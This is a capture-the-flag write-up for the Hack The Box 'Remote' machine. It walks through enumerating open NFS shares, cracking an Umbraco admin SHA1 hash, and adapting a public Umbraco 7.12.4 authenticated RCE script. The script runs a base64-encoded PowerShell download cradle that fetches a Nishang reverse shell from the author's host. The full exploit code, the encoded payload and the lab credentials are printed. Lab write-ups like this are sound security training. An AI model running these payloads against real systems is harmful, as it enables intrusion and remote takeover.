# Remote Write-up

I Started off with an Nmap scan to learn about the box.

```bash
root@HTBKali:~/HTB/Remote# nmap -A 10.10.10.180 -oN nmap/remote-A_scan
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 11:09 EDT
Nmap scan report for 10.10.10.180
Host is up (0.075s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/26%OT=21%CT=1%CU=43676%PV=Y%DS=2%DC=T%G=Y%TM=5E7CC61
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=106%GCD=1%ISR=109%CI=I%TS=U)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%
OS:TS=U)OPS(O1=M54BNW8NNS%O2=M54BNW8NNS%O3=M54BNW8%O4=M54BNW8NNS%O5=M54BNW8
OS:NNS%O6=M54BNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R
OS:=Y%DF=Y%T=80%W=FFFF%O=M54BNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%
OS:CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m18s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-26T15:12:33
|_  start_date: N/A

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   70.47 ms 10.10.16.1
2   35.55 ms 10.10.10.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.24 seconds
```

From this I noted open ports to check out being  21, 111, 80, 139, 445.

I like to leave webservers to be the last port to check out because they tend to take the most effort.  It is smart to start gobuster running while enumerating other services

I started with checking the Anonymous login to ftp.

```bash
root@HTBKali:~/HTB/Remote# ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> 
```

There was nothing inside the ftp server. Next port 111, to enumerate the port I ran rpcinfo.  

```bash 
root@HTBKali:~/HTB/Remote# rpcinfo -p 10.10.10.180
   program vers proto   port  service
    100000    2   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    4   udp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    4   tcp    111  portmapper
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   tcp   2049  nfs
    100005    1   tcp   2049  mountd
    100005    2   tcp   2049  mountd
    100005    3   tcp   2049  mountd
    100005    1   udp   2049  mountd
    100005    2   udp   2049  mountd
    100005    3   udp   2049  mountd
    100021    1   tcp   2049  nlockmgr
    100021    2   tcp   2049  nlockmgr
    100021    3   tcp   2049  nlockmgr
    100021    4   tcp   2049  nlockmgr
    100021    1   udp   2049  nlockmgr
    100021    2   udp   2049  nlockmgr
    100021    3   udp   2049  nlockmgr
    100021    4   udp   2049  nlockmgr
    100024    1   tcp   2049  status
    100024    1   udp   2049  status
   
```

This ended up being exactly what the Nmap scan showed, from this you can see that a nfs/mountd service is running.

To list any remote fileservers running I used showmount.

```bash
root@HTBKali:~/HTB/Remote# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

Now that I know the directory /site_backups is mountable by everyone lets mount it and see what is inside.

```bash
root@HTBKali:~/HTB/Remote# mkdir nfs
root@HTBKali:~/HTB/Remote# mount -t nfs 10.10.10.180:/site_backups nfs/ -o nolock
root@HTBKali:~/HTB/Remote# cd nfs
root@HTBKali:~/HTB/Remote/nfs# ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```

Looks like we found the backups from the webserver.  After some enumeration we find the CMS version 7.12.4. 


```bash
root@HTBKali:~/HTB/Remote/nfs# grep ConfigurationStatus Web.config 
<add key="umbracoConfigurationStatus" value="7.12.4" />
```    

With this I check if there was any known exploits for this CMS.

```bash
root@HTBKali:~/HTB/Remote/nfs# searchsploit umbraco
----------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                         |  Path
                                                                       | (/usr/share/exploitdb/)
----------------------------------------------------------------------- ----------------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                    | exploits/windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution             | exploits/aspx/webapps/46153.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting             | exploits/php/webapps/44988.txt
----------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

We see that Umbraco CMS 7.12.4 is vulnerable to an Authenticated RCE.  We just need to find those Creds.  After some more enumeration you find the SQL databese file `Umbraco.sdf` in `/App_Data`.  We can look at the contents of the file with strings.

```bash
root@HTBKali:~/HTB/Remote/nfs/App_Data# strings Umbraco.sdf | head
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

From this we can figure out the database looks something like 

| User | Login Username |  Password(hashed) | Hashing algorithm|
|-----|----|----|-----|
| admin | admin@htb.local | b8be16afba8c314ad33d812f22a04991b90e2aaa | {"hashAlgorithm":"SHA1"} |
| smith | smith@htb.local | jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= | {"hashAlgorithm":"HMACSHA256"} |
| ssmith | ssmith@htb.local | jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= | {"hashAlgorithm":"HMACSHA256"} |
| ssmith| ssmith@htb.local | 8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA= | {"hashAlgorithm":"HMACSHA256"} |

With this the admin password being SHA1 instead of HMACSHA256 is telling me to try to crack it.  I will need to get the hashcat example code for SHA1 before I start.  
```bash
root@HTBKali:~/HTB/Remote# hashcat -h | grep SHA1
    100 | SHA1                                             | Raw Hash
```

Then run hashcat with rockyou.txt.

```bash
vipertooth@vipertooth:~/HTB/remote$ hashcat -a 0 -m 100 hashes /opt/rockyou.txt
hashcat (v5.1.0-1397-g7f4df9eb) starting...

<snip>

b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese

Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA1
Hash.Target......: b8be16afba8c314ad33d812f22a04991b90e2aaa
Time.Started.....: Thu Mar 26 13:23:41 2020 (1 sec)
Time.Estimated...: Thu Mar 26 13:23:42 2020 (0 secs)
Guess.Base.......: File (/opt/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 11566.3 kH/s (5.30ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9830400/14344385 (68.53%)
Rejected.........: 0/9830400 (0.00%)
Restore.Point....: 9175040/14344385 (63.96%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: chautla -> babypollisteamo
Hardware.Mon.#1..: Temp: 53c Util: 29% Core:1556MHz Mem:3802MHz Bus:16

Started: Thu Mar 26 13:23:34 2020
Stopped: Thu Mar 26 13:23:43 2020
```

Now lets look at the RCE script we found with searchsploit and test it.

```bash
# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A


import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());
    
print("Start");

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "XXXX;
password="XXXX";
host = "XXXX";

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);

print("End");
```

First thing I noticed is where to change `login, password, and host`  the code should look as follows.  

```bash
login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";
```

Next I see the code is just poping calc. I changed this to ping.exe to test the execution of the script. I also added arguments for ping.exe where the script says `string cmd = ""`

![alt text](https://github.com/vipertooth/HTB-Remote/blob/master/resources/poc-ping.png)

Time to get a reverse shell!  Nishang as a few good powershell shells that come loaded into Kali. The one I use most is `/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1`.  I need to modify the file with my host and port.  This can be done by copying the example in the being and pasting it at the last line of the script. 

```bash
{
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.215 -Port 9003
```

I changed the file name to r2.ps1 to make it easy to use.  To get the exploit to call this file we will need to change the script to call back and grab the reverse shell.  To make sure there is no issues being sent over http it is best to base64 encode the arguments string.  To do with I will open powershell on Kali and create the encoded string.

```bash
root@HTBKali:~/HTB/Remote# pwsh
PowerShell 7.0.0
Copyright (c) Microsoft Corporation. All rights reserved.

https://aka.ms/powershell
Type 'help' to get help.

PS /root/HTB/Remote> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).downloadString('http://10.10.17.215:9000/r2.ps1')"))                  
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANwAuADIAMQA1ADoAOQAwADAAMAAvAHIAMgAuAHAAcwAxACcAKQA=
```

Then I updated the exploit script to be as follows:
```python
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "-encodedcommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANwAuADIAMQA1ADoAOQAwADAAMAAvAHIAMgAuAHAAcwAxACcAKQA="
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
 ```
